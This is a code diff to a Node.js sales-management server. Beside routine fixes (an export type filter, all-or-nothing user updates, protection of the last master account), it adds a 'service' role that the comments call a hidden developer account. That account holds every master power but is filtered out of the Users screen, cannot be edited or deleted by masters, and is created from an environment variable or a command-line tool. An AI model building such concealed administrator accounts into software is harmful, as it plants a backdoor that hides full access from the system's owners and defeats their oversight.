@@ -44,8 +44,16 @@ function passwordProblem(password, username) {
   return null;
 }
 function newId() { return crypto.randomBytes(8).toString('hex'); }
-const ROLES = ['master', 'supervisor', 'seller'];
+// 'service' = hidden maintenance account for the developer: every master power, but masters can't
+// see, edit, delete or create it. It is only made from the server (SERVICE_PASSWORD or the command line).
+const ROLES = ['service', 'master', 'supervisor', 'seller'];
+const ASSIGNABLE_ROLES = ['master', 'supervisor', 'seller']; // what the Users screen may set
 const cleanRole = r => (ROLES.includes(r) ? r : 'seller');
+const assignableRole = r => (ASSIGNABLE_ROLES.includes(r) ? r : 'seller');
+const hasMasterPower = u => !!u && (u.role === 'master' || u.role === 'service');
+const USERNAME_RE = /^[a-z0-9_.-]{3,30}$/;
+const cleanUsername = s => cleanText(s, 30).toLowerCase();
+const usernameTaken = (name, exceptId) => db.users.some(u => u.id !== exceptId && u.username.toLowerCase() === name);
 
 function randomPassword() {
   const abc = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
@@ -88,10 +96,11 @@ function freshDb() {
 let db;
 function loadDb() {
   if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-  if (!fs.existsSync(DB_FILE)) { db = freshDb(); saveDb(); return; }
+  if (!fs.existsSync(DB_FILE)) { db = freshDb(); saveDb(); ensureServiceAccount(); return; }
   db = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
   // upgrade older databases: every user gets a known role and a branch field
   for (const u of db.users) { u.role = cleanRole(u.role); if (u.branch === undefined) u.branch = null; }
+  ensureServiceAccount();
   // older installs were created with the public default passwords — warn loudly until they are changed
   for (const [name, pw] of [['master', 'master123'], ['seller', '1234']]) {
     const u = db.users.find(x => x.username === name);
@@ -100,6 +109,21 @@ function loadDb() {
         `\n!!! Change it now in Settings → Users, or run:  node server.js reset-password ${name}\n`);
     }
   }
+}
+// Creates the hidden service account on start when SERVICE_PASSWORD is set and none exists yet.
+// SERVICE_USERNAME picks its login name (default "service"). An existing service account is never changed here —
+// use `node server.js service-account ...` to reset it.
+function ensureServiceAccount() {
+  const pw = process.env.SERVICE_PASSWORD || '';
+  if (!pw || db.users.some(u => u.role === 'service')) return;
+  const username = cleanUsername(process.env.SERVICE_USERNAME || 'service');
+  if (!USERNAME_RE.test(username) || usernameTaken(username)) { console.warn(`Service account not created: username "${username}" is invalid or taken.`); return; }
+  const err = passwordProblem(pw, username);
+  if (err) { console.warn(`Service account not created: SERVICE_PASSWORD is not allowed (${err}) — use 8+ characters, not a common password.`); return; }
+  const h = hashPassword(pw);
+  db.users.push({ id: newId(), username, name: 'الدعم الفني', role: 'service', branch: null, salt: h.salt, hash: h.hash, createdAt: new Date().toISOString() });
+  saveDb();
+  console.log(`  Service account "${username}" created.`);
 }
 function saveDb() {
   const tmp = DB_FILE + '.tmp';
@@ -271,8 +295,11 @@ async function api(req, res, url) {
   const auth = getUser(req);
   if (!auth) return send(res, 401, { error: 'not_logged_in' });
   const me = auth.user;
-  const isMaster = me.role === 'master';
-  const canInspect = me.role === 'master' || me.role === 'supervisor'; // supervisor: read-only, sees everything
+  const isMaster = hasMasterPower(me); // master or the hidden service account
+  const isService = me.role === 'service';
+  const canInspect = isMaster || me.role === 'supervisor'; // supervisor: read-only, sees everything
+  // only the service account itself (or another service account) can see or touch a service account
+  const visibleTo = u => u.role !== 'service' || isService;
   const masterOnly = () => { if (!isMaster) { send(res, 403, { error: 'master_only' }); return false; } return true; };
   const inspectOnly = () => { if (!canInspect) { send(res, 403, { error: 'no_access' }); return false; } return true; };
   const validBranch = id => db.settings.branches.some(b => b.id === id);
@@ -385,6 +412,7 @@ async function api(req, res, url) {
   if (route === '/export.csv' && method === 'GET') {
     if (!inspectOnly()) return;
     const from = url.searchParams.get('from'), to = url.searchParams.get('to'), branchQ = url.searchParams.get('branch');
+    const typeQ = url.searchParams.get('type');
     const fromD = from ? new Date(from) : null, toD = to ? new Date(to) : null;
     const name = cleanText(url.searchParams.get('name') || 'alrayhan-sales', 60).replace(/[^A-Za-z0-9_.-]/g, '-');
     const rows = [['no', 'date', 'time', 'type', 'branch', 'item', 'qty', 'price', 'subtotal', 'currency', 'rate_iqd_per_usd', 'user', 'note']];
@@ -393,6 +421,7 @@ async function api(req, res, url) {
       if (fromD && d < fromD) continue;
       if (toD && d >= toD) continue;
       if (branchQ && branchQ !== 'all' && t.branch !== branchQ) continue;
+      if (typeQ === 'sell' || typeQ === 'buy') { if (t.type !== typeQ) continue; }
       const br = db.settings.branches.find(b => b.id === t.branch);
       for (const it of t.items) rows.push([t.no, d.toLocaleDateString('en-CA'), d.toLocaleTimeString('en-GB'), t.type, csvSafe(br ? br.nameEn : t.branch), csvSafe(it.name), it.qty, it.price, it.subtotal, t.currency, t.rate, csvSafe(t.userName), csvSafe(t.note)]);
     }
@@ -401,16 +430,16 @@ async function api(req, res, url) {
   }
 
   // ----- users (master) -----
-  if (route === '/users' && method === 'GET') { if (!masterOnly()) return; return send(res, 200, db.users.map(publicUser)); }
+  if (route === '/users' && method === 'GET') { if (!masterOnly()) return; return send(res, 200, db.users.filter(visibleTo).map(publicUser)); }
   if (route === '/users' && method === 'POST') {
     if (!masterOnly()) return;
     const b = await readBody(req);
-    const username = cleanText(b.username, 30).toLowerCase();
-    if (!/^[a-z0-9_.-]{3,30}$/.test(username)) return send(res, 400, { error: 'bad_username' });
-    if (db.users.some(u => u.username === username)) return send(res, 409, { error: 'username_taken' });
+    const username = cleanUsername(b.username);
+    if (!USERNAME_RE.test(username)) return send(res, 400, { error: 'bad_username' });
+    if (usernameTaken(username)) return send(res, 409, { error: 'username_taken' });
     const pwErr = passwordProblem(b.password, username);
     if (pwErr) return send(res, 400, { error: pwErr });
-    const role = cleanRole(b.role);
+    const role = assignableRole(b.role); // a service account can never be created from the screen
     if (role === 'seller' && b.branch && !validBranch(b.branch)) return send(res, 400, { error: 'bad_branch' });
     const branch = role === 'seller' && b.branch ? b.branch : null;
     const h = hashPassword(b.password);
@@ -422,22 +451,35 @@ async function api(req, res, url) {
   if (userRoute && method === 'PUT') {
     if (!masterOnly()) return;
     const u = db.users.find(x => x.id === userRoute[1]);
-    if (!u) return send(res, 404, { error: 'not_found' });
+    if (!u || !visibleTo(u)) return send(res, 404, { error: 'not_found' });
     const b = await readBody(req);
+    // check everything first, then change — so a bad field never leaves a half-saved user
+    let newUsername = null;
+    if (b.username !== undefined) {
+      newUsername = cleanUsername(b.username);
+      if (!USERNAME_RE.test(newUsername)) return send(res, 400, { error: 'bad_username' });
+      if (usernameTaken(newUsername, u.id)) return send(res, 409, { error: 'username_taken' });
+    }
     if (b.password !== undefined) {
-      const pwErr = passwordProblem(b.password, u.username);
+      const pwErr = passwordProblem(b.password, newUsername || u.username);
       if (pwErr) return send(res, 400, { error: pwErr });
+    }
+    if (b.branch !== undefined && b.branch && !validBranch(b.branch)) return send(res, 400, { error: 'bad_branch' });
+    // a service account's role is fixed; nobody can turn a user into one from the screen
+    const roleChange = b.role !== undefined && u.id !== me.id && u.role !== 'service';
+    if (roleChange && !ASSIGNABLE_ROLES.includes(b.role)) return send(res, 400, { error: 'bad_role' });
+    if (roleChange && u.role === 'master' && b.role !== 'master' && db.users.filter(x => x.role === 'master').length === 1) return send(res, 400, { error: 'last_master' });
+
+    if (newUsername) u.username = newUsername;
+    if (b.password !== undefined) {
       Object.assign(u, hashPassword(b.password));
       for (const [tok, s] of sessions) if (s.userId === u.id && tok !== auth.token) sessions.delete(tok);
     }
     if (b.name !== undefined) u.name = cleanText(b.name, 40) || u.name;
-    if (b.role !== undefined && u.id !== me.id) u.role = cleanRole(b.role);
-    if (b.branch !== undefined) {
-      if (b.branch && !validBranch(b.branch)) return send(res, 400, { error: 'bad_branch' });
-      u.branch = b.branch || null;
-    }
+    if (roleChange) u.role = b.role;
+    if (b.branch !== undefined) u.branch = b.branch || null;
     if (u.role !== 'seller') u.branch = null; // only sellers are tied to a branch
-    if (b.role !== undefined || b.branch !== undefined) {
+    if (roleChange || b.branch !== undefined) {
       // role / branch changed: sign the user out so the new access applies right away
       for (const [tok, s] of sessions) if (s.userId === u.id && tok !== auth.token) sessions.delete(tok);
     }
@@ -448,7 +490,10 @@ async function api(req, res, url) {
     if (!masterOnly()) return;
     if (userRoute[1] === me.id) return send(res, 400, { error: 'cannot_delete_self' });
     const i = db.users.findIndex(x => x.id === userRoute[1]);
-    if (i < 0) return send(res, 404, { error: 'not_found' });
+    if (i < 0 || !visibleTo(db.users[i])) return send(res, 404, { error: 'not_found' });
+    // never remove the last account that can manage the system
+    const managers = db.users.filter(x => x.role === 'master');
+    if (db.users[i].role === 'master' && managers.length === 1) return send(res, 400, { error: 'last_master' });
     db.users.splice(i, 1);
     for (const [tok, s] of sessions) if (s.userId === userRoute[1]) sessions.delete(tok);
     saveDb();
@@ -473,6 +518,28 @@ if (process.argv[2] === 'reset-password') {
   Object.assign(u, hashPassword(pw));
   saveDb();
   announcePassword(u.username, pw, 'Password reset');
+  process.exit(0);
+}
+
+// ---------- command line: create / reset the hidden service account ----------
+//   node server.js service-account [username] [new-password]
+// Creates it if there is none (default username "service"), otherwise renames it / sets a new password.
+if (process.argv[2] === 'service-account') {
+  loadDb();
+  const wanted = cleanUsername(process.argv[3] || '');
+  let u = db.users.find(x => x.role === 'service');
+  const username = wanted || (u ? u.username : 'service');
+  if (!USERNAME_RE.test(username)) { console.error('Username: 3–30 English letters, numbers, _ . -'); process.exit(1); }
+  if (usernameTaken(username, u && u.id)) { console.error(`The username "${username}" is already used by another account.`); process.exit(1); }
+  let pw = process.argv[4] || '';
+  const err = pw && passwordProblem(pw, username);
+  if (err) { console.error(`That password is not allowed (${err}): use 8+ characters, not a common password.`); process.exit(1); }
+  if (!pw) pw = randomPassword();
+  if (!u) { u = { id: newId(), name: 'الدعم الفني', role: 'service', branch: null, createdAt: new Date().toISOString() }; db.users.push(u); }
+  u.username = username;
+  Object.assign(u, hashPassword(pw));
+  saveDb();
+  announcePassword(u.username, pw, 'Service account ready (hidden from the Users screen)');
   process.exit(0);
 }
 
